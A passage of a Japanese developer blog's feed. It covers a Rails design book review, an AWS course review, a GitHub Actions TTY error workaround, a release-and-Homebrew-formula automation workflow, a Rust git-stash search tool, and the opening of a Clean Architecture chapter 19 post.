&lt;del>値オブジェクトってもう型っぽいし&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JVM">JVM&lt;/a>言語とかGo使ったほうがいいのでは&lt;/del>。&lt;/p>
&lt;h3>サービスオブジェクト&lt;/h3>
&lt;p>何度実行しても結果整合性が取れる形にしたいですね（小並）&lt;/p>
&lt;h2>12章 複雑な&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B9%A5%B1%A1%BC%A5%B9">ユースケース&lt;/a>を表現する&lt;/h2>
&lt;p>&lt;b>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>における「レール」の正体&lt;/b>と&lt;b>「レール」の限界と向き合い方&lt;/b>という２つの節がよく言われる「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>辛い」を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B8%C0%B8%EC%B2%BD">言語化&lt;/a>してあったのが良かったです。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>における「モデル」は「記事の投稿が完了したらメールを送信する」といった&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B9%A5%B1%A1%BC%A5%B9">ユースケース&lt;/a>ロジックと、「記事には投稿者がいる」といった&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>モデルが全部「モデル」に置けることが「レール」の正体であり、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>の初期開発においてまずファットモデルが良い方向だとされる&lt;a href="#f-e4bf4850" name="fn-e4bf4850" title="少なくとも僕の周りはそうだけど賛否両論あるかもしれない">*2&lt;/a>のもこのためだと思います。&lt;br>
よくフォームオブジェクトやプレゼンターが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>開発で用いられていますが、改めて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E6%A1%BC%A5%B9%A5%B1%A1%BC%A5%B9">ユースケース&lt;/a>をモデルから分離するための技法の一つだと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B8%C0%B8%EC%B2%BD">言語化&lt;/a>できるとモデルに書くべきロジックとフォームオブジェクトやプレゼンターに書くべきロジックの区別がつけやすくなるのではないでしょうか。
クリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>やDDDの本は当然&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>の基本や考え方が中心になって話が進むのですが、パ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>はあくまで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>中心で話が進むので実務でも活かしやすい章だと思います。&lt;/p>
&lt;h3>13章 複雑なデータ操作を実装する&lt;/h3>
&lt;p>&lt;b>Concernがモデルに密接に結びつくのはまずい&lt;/b>。最近そんなコードを書きました！！！！　すいませんでした！！！&lt;br>
自分は値オブジェクトとかサービスオブジェクトに分離する前にConcern化の方を先に考えていたので参考になりました。&lt;/p>
&lt;div class="footnote">
&lt;p class="footnote">&lt;a href="#fn-3bcf721f" name="f-3bcf721f" class="footnote-number">*1&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">ドキュメントのこの節で詳しい挙動がのっていました &lt;a href="https://docs.docker.jp/develop/develop-images/dockerfile_best-practices.html#leverage-build-cache">Dockerfile のベスト・プラクティス — Docker-docs-ja 19.03 ドキュメント&lt;/a>
&lt;/span>&lt;/p>
&lt;p class="footnote">&lt;a href="#fn-e4bf4850" name="f-e4bf4850" class="footnote-number">*2&lt;/a>&lt;span class="footnote-delimiter">:&lt;/span>&lt;span class="footnote-text">少なくとも僕の周りはそうだけど賛否両論あるかもしれない&lt;/span>&lt;/p>
&lt;/div>
&lt;/body></description></item><item><title>東大計数工学科講義「AWSによるクラウド入門」の感想</title><link>https://qwyng.dev/posts/2020/07/26/223226/</link><pubDate>Sun, 26 Jul 2020 22:32:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/07/26/223226/</guid><description>&lt;body>
&lt;p>四連休は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C4%A5%A4%A5%C3%A5%BF%A1%BC">ツイッター&lt;/a>で回ってきた東大計数工学化の講義でつかわれているらしい教材をやっていた。&lt;/p>
&lt;p>&lt;a href="https://tomomano.gitlab.io/intro-aws/#_%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB">AWSによるクラウド入門&lt;/a>&lt;/p>
&lt;p>&lt;/p>
&lt;blockquote data-conversation="none" class="twitter-tweet" data-lang="en">
&lt;p lang="ja" dir="ltr">出身研究室の先輩が東大計数工学科の講義の一部として担当した『&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>による&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>入門』の資料が公開されています。&lt;br>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>入門者向けに簡潔かつ平易な言葉で書かれている貴重な資料です。5つのハンズオンで、最後は俳句を投稿するWebアプリを実装・デプロイします。&lt;a href="https://t.co/XmFGGnsP3r">https://t.co/XmFGGnsP3r&lt;/a> &lt;a href="https://t.co/9nDxzBovTW">pic.twitter.com/9nDxzBovTW&lt;/a>&lt;/p>— Shion Honda (@shion_honda) &lt;a href="https://twitter.com/shion_honda/status/1281572631544655872?ref_src=twsrc%5Etfw">July 10, 2020&lt;/a>
&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;p>学習用のDocker imageが既に用意されていてコンテナを立ち上げれば準備が全て終わるので便利。
内容も細かい技術の特徴というよりはなぜその技術が生まれたのか？を中心に書かれていて勉強になった。&lt;/p>
&lt;h2>なぜ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>を使うのか？&lt;/h2>
&lt;p>設定一つでスケールアウト、スケールアップ共に可能。物理サーバーを管理する必要がない。&lt;/p>
&lt;h2>なぜサーバーレス？&lt;/h2>
&lt;p>サーバーフル&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>との対比で書かれていてわかりやすかった。&lt;br>
従来&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Web%A5%B5%A1%BC%A5%D3%A5%B9">Webサービス&lt;/a>だと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>サーバーに送られるタスクの消費する計算資源は一定ではないのにもかかわらず、どんなタスクでもサーバーの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>を一&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C2%E6%B3%E4">台割&lt;/a>り当てなければいけない。サーバーの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%D4%C6%AF%CE%A8">稼働率&lt;/a>を高めてコストパーフォーマンスを最大化するのにもコストがかかる。&lt;br>
サーバーレスではサーバーの計算資源を丸々専有してプロセスを常駐させるのではなく、実行したいプログラムを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>に提出して&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>側の大きな計算資源の一部を使って提出されたプログラムを実行する。この方式だと必要のない計算資源を使うようなことがなくなるのでコストパーフォーマンスを最大化しやすい。
S3もDynamoDBもサーバーレスの考え方が元になっているストレージサービスで、最初に決まった容量を買うのではなく使った容量でコストが決まる方式。&lt;br>
「従来のサーバーフル&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>は賃貸、サー&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D0%A1%BC%A5%EC%A5%B9%A5%AF">バーレスク&lt;/a>ラウドは電気・ガス・水道料金のようなもの」という解説もわかりやすかった。&lt;br>
サーバーレスのデメリットも解説があった。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>なら&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>に寄り添ったシステムになってしまうので、サーバーフルよりもプラットフォーム間の移動は難しくなる。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AF%A5%E9%A5%A6%A5%C9">クラウド&lt;/a>プロパイダーとしては自社システムに依存してもらいたいのだろうということだった。&lt;/p>
&lt;h2>Hands-onを試してみて&lt;/h2>
&lt;p>この教材は最後に実際にVue.jsを使った静的アセットをS3において、LamdaにGET、POSTの関数を配置してDynamoDBでデータを永続化する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Web%A5%B5%A1%BC%A5%D3%A5%B9">Webサービス&lt;/a>を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>に構成する。実際に自分がコードを書くことはなく、用意された&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">スクリプト&lt;/a>を叩いて、結果を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AWS">AWS&lt;/a>コンソールから確認するという作業が主だった。
実際に複数のリク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トを同時にAPIGatewayに送ったりする&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">スクリプト&lt;/a>も用意されていて、本当に試しやすい教材でした。用語の説明も一つ一つ丁寧だった。こんな授業を受けられる学生が羨ましいですな。&lt;/p>
&lt;/body></description></item><item><title>GitHub Actionsで#&amp;lt;Errno::ENOTTY</title><link>https://qwyng.dev/posts/2020/07/16/233949/</link><pubDate>Thu, 16 Jul 2020 23:39:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/07/16/233949/</guid><description>&lt;body>
&lt;h2>発生した経緯&lt;/h2>
&lt;p>&lt;a href="https://qiita.com/QWYNG/items/0e2e6b72bd1969d0d751">自作のRubyGem&lt;/a>のテストとCIを整えていた時に遭遇。
パスワード入力の所でIO#noechoを使うように修正した所、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a> Actions内で以下のようなエラーが起きた。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> 1) GreenDay::Cli login valid name and password create cookie-store
Failure/Error: password = STDIN.noecho { |stdin| stdin.gets(chomp: true) }.tap { puts }
Errno::ENOTTY:
Inappropriate ioctl for device
# ./lib/green_day/cli.rb:19:in `noecho'
# ./lib/green_day/cli.rb:19:in `login'
# ./spec/cli_spec.rb:83:in `block (3 levels) in &amp;lt;top (required)&amp;gt;'
# ./spec/cli_spec.rb:101:in `block (4 levels) in &amp;lt;top (required)&amp;gt;' &lt;/pre>
&lt;p>ローカルでは通ったのでCI環境での問題っぽい。&lt;/p>
&lt;h2>解決まで&lt;/h2>
&lt;p>"&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a> Actions Inappropriate ioctl for device"でググった所以下のissueを発見。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Factions%2Frunner%2Fissues%2F241" title="Not a tty · Issue #241 · actions/runner" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/actions/runner/issues/241">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>どうやらTTYなるもので無いのが駄目らしい。&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EF%A1%BC%A5%AF%A5%A2%A5%E9%A5%A6%A5%F3%A5%C9">ワークアラウンド&lt;/a>らしいけどこのコメントで解決した&lt;/p>
&lt;p>&lt;a href="https://github.com/actions/runner/issues/241#issuecomment-577360161">https://github.com/actions/runner/issues/241#issuecomment-577360161&lt;/a>&lt;/p>
&lt;p>&lt;code>script&lt;/code>はデフォルトで&lt;code>typescript&lt;/code>ってファイルにターミナルのsessionをまるごと記録してくれるもの。
仕組みはよくわかってないけど実際にローカルでscriptを叩くとセッションが新しく始まって後述の&lt;code>tty&lt;/code>コマンドの結果も変化したのでなにかしらttyに当たるものを作るとうまく行く原理なのだろうか。&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/travis">travis&lt;/a> ciでは問題が再現しなかったので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a> Actions特有の問題っぽい。Dockerコンテナの出力をキャプチャしているのが関係しているのかもしれない。&lt;/p>
&lt;p>最終的に&lt;code>script -e -c&lt;/code>をつけてテストを実行するとエラーは起きなくなった。
&lt;a href="https://github.com/QWYNG/green_day/blob/1e174b17201743723a98e7ae245de4fe27e4bbc6/.github/workflows/ruby.yml#L28">https://github.com/QWYNG/green_day/blob/1e174b17201743723a98e7ae245de4fe27e4bbc6/.github/workflows/ruby.yml#L28&lt;/a>&lt;/p>
&lt;h2>tty is 何&lt;/h2>
&lt;p>最後にttyというワードも初めて知ったのでメモ。
tty自体は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>コマンド&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> man tty
TTY(1) User Commands TTY(1)
NAME
tty - print the file name of the terminal connected to standard input &lt;/pre>
&lt;p>ターミナルに入力していると思っていた標準入力は実際はこのファイルへ送っているらしい。&lt;/p>
&lt;pre> ~  ps 2020年07月16日 23時00分57秒
PID TTY TIME CMD
83617 pts/2 00:00:00 fish
83739 pts/2 00:00:00 ps
~  ll /proc/83617/fd 2020年07月16日 23時01分00秒
合計 0
lrwx------ 1 qwyng qwyng 64 7月 16 23:00 0 -&amp;gt; /dev/pts/2
lrwx------ 1 qwyng qwyng 64 7月 16 23:00 1 -&amp;gt; /dev/pts/2
lrwx------ 1 qwyng qwyng 64 7月 16 23:00 2 -&amp;gt; /dev/pts/2
lr-x------ 1 qwyng qwyng 64 7月 16 23:00 3 -&amp;gt; /home/qwyng/
lr-x------ 1 qwyng qwyng 64 7月 16 23:00 4 -&amp;gt; 'pipe:[727942]'
l-wx------ 1 qwyng qwyng 64 7月 16 23:00 5 -&amp;gt; 'pipe:[727942]'
lr-x------ 1 qwyng qwyng 64 7月 16 23:00 6 -&amp;gt; 'pipe:[728533]'
l-wx------ 1 qwyng qwyng 64 7月 16 23:00 7 -&amp;gt; 'pipe:[728533]'
lrwx------ 1 qwyng qwyng 64 7月 16 23:00 8 -&amp;gt; /run/user/1000/fish_universal_variables.notifier|
~  tty 2020年07月16日 23時01分19秒
/dev/pts/2
~  2020年07月16日 23時01分35秒
&lt;/pre>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>にもIOがttyか調べるメソッドが合った。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fdocs.ruby-lang.org%2Fja%2Flatest%2Fmethod%2FIO%2Fi%2Fisatty.html" title="IO#isatty (Ruby 2.7.0 リファレンスマニュアル)" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://docs.ruby-lang.org/ja/latest/method/IO/i/isatty.html">docs.ruby-lang.org&lt;/a>&lt;/cite>&lt;/p>
&lt;p>IO#nochoの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>もttyが前提のようなコードだった。&lt;/p>
&lt;p>&lt;a href="https://github.com/ruby/io-console/blob/a4e0a1d67b6bd61f47f37b810eb261fc18a70967/ext/io/console/console.c#L571">https://github.com/ruby/io-console/blob/a4e0a1d67b6bd61f47f37b810eb261fc18a70967/ext/io/console/console.c#L571&lt;/a>&lt;/p>
&lt;/body></description></item><item><title>GitHubActionsでリリースとHomeBrewのformulaレポジトリ更新を一度に行う</title><link>https://qwyng.dev/posts/2020/07/06/221937/</link><pubDate>Mon, 06 Jul 2020 22:19:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/07/06/221937/</guid><description>&lt;body>
&lt;p>個人でHomeBrew通してバイナリを公開する時、formulaを作成してレポジトリを立ち上げる必要があります。 &lt;br>
そこにはバージョンやリリースしたいファイルのURL、SHA256 checksumを含めなくてはならないのですが、バイナリをアップデートしたい時に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>のレポジトリだけでなくformulaのレポジトリも更新しなくてはならず面倒です。&lt;br>
そこでGitHubActionsで２つのレポジトリを連携してリリースとformulaの更新を一度に行える様にしてみました。&lt;/p>
&lt;h2>対象レポジトリ&lt;/h2>
&lt;p>Rustで書いた&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CLI">CLI&lt;/a>アプリである&lt;a href="https://github.com/QWYNG/harvest">GitHub - QWYNG/harvest: stashes grep tool with rust&lt;/a>とそのformulaである
&lt;a href="https://github.com/QWYNG/homebrew-harvest">GitHub - QWYNG/homebrew-harvest&lt;/a>が対象レポジトリです。&lt;/p>
&lt;h2>workflow&lt;/h2>
&lt;p>まずリリースする側のレポジトリのworkflowの設定です。長いので中略してます。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> name: Release
on:
push:
tags:
- 'v*.*.*'
jobs:
build:
strategy:
matrix:
os: [ubuntu-latest, macOS-latest]
rust: [stable]
runs-on: ${{ matrix.os }}
steps:
~~~ snip ~~~
- name: Set version
id: set_version
run: echo ::set-output name=version::${GITHUB_REF/refs\/tags\//}
env:
GITHUB_REF: ${{ github.ref }}
- name: Build for linux
if: matrix.os == 'ubuntu-latest'
run: |
cargo build --release --target=x86_64-unknown-linux-musl
zip -j harvest-${VERSION}-x86_64-lnx.zip target/x86_64-unknown-linux-musl/release/harvest
env:
VERSION: ${{ steps.set_version.outputs.version }}
- name: Build for macOS
if: matrix.os == 'macOS-latest'
run: |
cargo build --release --target=x86_64-apple-darwin
zip -j harvest-${VERSION}-x86_64-mac.zip target/x86_64-apple-darwin/release/harvest
env:
VERSION: ${{ steps.set_version.outputs.version }}
- name: Set SHA256
if: matrix.os == 'macOS-latest'
id: sha_256
run: |
echo "::set-output name=sha::$(shasum -a 256 harvest-${VERSION}-x86_64-mac.zip |awk '{print $1}')"
env:
VERSION: ${{ steps.set_version.outputs.version }}
- name: Release
id: release
uses: softprops/action-gh-release@v1
with:
files: '*.zip'
env:
GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
- name: Dispatch homebrew Repo update
if: matrix.os == 'macOS-latest'
uses: peter-evans/repository-dispatch@v1
with:
token: ${{ secrets.HOMEBREW_REPO_GITHUB_TOKEN }}
repository: QWYNG/homebrew-harvest
event-type: update
client-payload: '{"version": "${{ steps.set_version.outputs.version }}", "sha": "${{ steps.sha_256.outputs.sha }}" }'
&lt;/pre>
&lt;p>&lt;code>Build for macOS&lt;/code>ではビルドとzipへの圧縮を行っています。&lt;br>
GitHubActionsは&lt;code>::set-output name={name}::{value}&lt;/code>の形で後のstepで&lt;code>steps.&amp;lt;step id&amp;gt;.outputs.{name}&lt;/code>として値を使用できます。これを利用して&lt;code>Set version&lt;/code>と&lt;code>Set SHA256&lt;/code>でバージョンとzipファイルのchecksumをセットしています。&lt;br>
最後に取得したバージョンとchecksumをrepository-dispatchをつかってformulaレポジトリに投げます。普通に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/curl">curl&lt;/a>で発火させることもできますが、今回は&lt;/p>
&lt;p>&lt;a href="https://github.com/peter-evans/repository-dispatch">GitHub - peter-evans/repository-dispatch: A GitHub action to create a repository dispatch event&lt;/a>が便利そうだったので使ってみました。&lt;/p>
&lt;p>dispatchを受け取るformulaレポジトリ側のworkflowは以下&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> name: Release
on: repository_dispatch
jobs:
build:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@master
with:
persist-credentials: false
fetch-depth: 0
- name: Create local version change
run: |
truncate version.rb --size 0
echo 'VERSION = "${{ github.event.client_payload.version }}"' &amp;gt; version.rb
echo 'SHA = "${{ github.event.client_payload.sha }}"' &amp;gt;&amp;gt; version.rb
- name: Commit version change
run: |
git config --local user.email "action@github.com"
git config --local user.name "GitHub Action"
git commit -m "update version" -a
- name: Push changes
uses: ad-m/github-push-action@master
with:
github_token: ${{ secrets.GITHUB_TOKEN }} &lt;/pre>
&lt;p>dispatchで受け取った&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9">ペイロード&lt;/a>を使って&lt;code>version.rb&lt;/code>を書き直してコミットしてプッシュしてます。
&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200706/20200706221128.png" alt="f:id:sasa5740:20200706221128p:plain" title="f:id:sasa5740:20200706221128p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
無事自動でformulaレポジトリを更新できました。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>愚直な実装なのでHomeBrewに詳しければもう少しスマートにできるかもしれないです。&lt;br>
後&lt;a href="https://sasa5740.hatenablog.com/entry/2020/06/22/230935">harvest&lt;/a>をgit diffではなくgit stash show -pの結果で検索するように改良し、更に標準出力にページャを導入しました。大分使いやすくなったので満足。&lt;/p>
&lt;/body></description></item><item><title>Rustでgit stashを検索できるツールを書いた</title><link>https://qwyng.dev/posts/2020/06/22/230935/</link><pubDate>Mon, 22 Jun 2020 23:09:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/06/22/230935/</guid><description>&lt;body>
&lt;p>仕事でよくgit stashを使うのですが「あれ？あのstashどれだっけ？」が頻発します。&lt;code>git stash show stash@{n}&lt;/code>を複数回行えば見つかるのですが、結構面倒くさいです。ということでstashを検索してくれる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CLI">CLI&lt;/a>ツールを書きました。&lt;br>
&lt;a href="https://doc.rust-jp.rs/book/second-edition/">Rust the book&lt;/a>を読みながらRustで書いています。今年はRust通して静的型付け言語やっていきたい。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fharvest" title="QWYNG/harvest" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/harvest">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;a href="https://crates.io/crates/harvest">https://crates.io/crates/harvest&lt;/a>&lt;/p>
&lt;p>crates.ioとHomebrewに公開してるので、Rustつかってない人でも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/brew">brew&lt;/a>からインストールすることができます。&lt;/p>
&lt;ul>
&lt;li>cargo&lt;br>
&lt;code>cargo install harvest&lt;/code>
&lt;/li>
&lt;li>Homebrew&lt;br>
&lt;code>brew tap QWYNG/harvest&lt;/code>&lt;br>
&lt;code>brew install harvest&lt;/code>
&lt;/li>
&lt;/ul>
&lt;h2>使い方&lt;/h2>
&lt;p>&lt;code>harvest &amp;lt;pattern&amp;gt;&lt;/code>
で今のブランチとstashの間のdiffからpatternを検索してヒットしたstashを以下の形式で標準出力します。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> harvest fn
stash@{0}: WIP on master: beb5221 rm tests module
src/bm.rs | 2 ++
1 file changed, 2 insertions(+)
stash@{1}: WIP on master: beb5221 rm tests module
src/lib.rs | 1 +
1 file changed, 1 insertion(+) &lt;/pre>
&lt;p>patternといってますが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD">正規表現&lt;/a>とかは渡せません。&lt;br>
なぜ検索結果の出力なのに検索した文字列が実際に書かれている箇所を抜き出さないかというと、僕がこっちのほうが見やすいと思ったからです。&lt;br>
単純にgit diff stash＠{n}の中身を全探索してるだけなので、例えば&lt;code>harvest +&lt;/code>と実行すると全部のstashが出てきます。&lt;br>
文字列検索はせっかくなので自分でBMH法を実装してみました。（多分Rustのネイティブ関数の&lt;code>contains&lt;/code>のほうが大分速い）&lt;/p>
&lt;h2>今後やりたいこと&lt;/h2>
&lt;ul>
&lt;li>真面目にパフォーマンスチューニング&lt;/li>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/brew">brew&lt;/a>への公開の自動化&lt;/li>
&lt;li>std::process::Outputのモックがよくわからなくてやってない統合テスト&lt;/li>
&lt;li>単に&lt;code>git stash show@{n}&lt;/code>を全部行うだけのoption&lt;/li>
&lt;/ul>
&lt;h2>感想&lt;/h2>
&lt;p>やっぱりバイナリにして色々配布できるのは便利。あと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/IDE">IDE&lt;/a>でRustの開発するのは楽しい。&lt;/p>
&lt;/body></description></item><item><title>クリーンアーキテクチャ19章の問に答える</title><link>https://qwyng.dev/posts/2020/06/01/234640/</link><pubDate>Mon, 01 Jun 2020 23:46:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/06/01/234640/</guid><description>&lt;body>
&lt;p>設計とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>の記事このブログなんもないことに気づいた。&lt;br>
最近クリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>を社内で読書会を主催して読み進めてます。&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B07FSBHS2V/hatena-blog-22/">&lt;img src="https://m.media-amazon.com/images/I/51mQrYTahJL._SL160_.jpg" class="hatena-asin-detail-image" alt="Clean Architecture　達人に学ぶソフトウェアの構造と設計 (アスキードワンゴ)" title="Clean Architecture　達人に学ぶソフトウェアの構造と設計 (アスキードワンゴ)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B07FSBHS2V/hatena-blog-22/">Clean Architecture　達人に学ぶソフトウェアの構造と設計 (アスキードワンゴ)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/%A3%D2%A3%EF%A3%E2%A3%E5%A3%F2%A3%F4%20%A3%C3%A1%A5%A3%CD%A3%E1%A3%F2%A3%F4%A3%E9%A3%EE" class="keyword">Ｒｏｂｅｒｔ Ｃ．Ｍａｒｔｉｎ&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%B3%D1%20%C0%AC%C5%B5" class="keyword">角 征典&lt;/a>,&lt;a href="http://d.hatena.ne.jp/keyword/%B9%E2%CC%DA%20%C0%B5%B9%B0" class="keyword">高木 正弘&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2018/08/01&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Kindle">Kindle&lt;/a>版&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>一人だと挫折したり難しい表現があったりするので色んな人と読書会できて助かっています。&lt;br>
この本の19章の最後の問がソフトウエア&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>の原則をまとめるのに良い機会だったのでまとめてみますた。&lt;/p>
&lt;h2>問&lt;/h2>
&lt;p>クリーン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>の19章では以下のような&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3">アーキテクチャ&lt;/a>が示されます。暗号化プログラム作成が目的です。&lt;br>
19章の最後の「原則がどこで使われているのか、どうして使われているのかを確認してほしい」という問が記事の主題です。
&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200601/20200601233305.png" alt="f:id:sasa5740:20200601233305p:plain" title="f:id:sasa5740:20200601233305p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;h2>返答&lt;/h2>
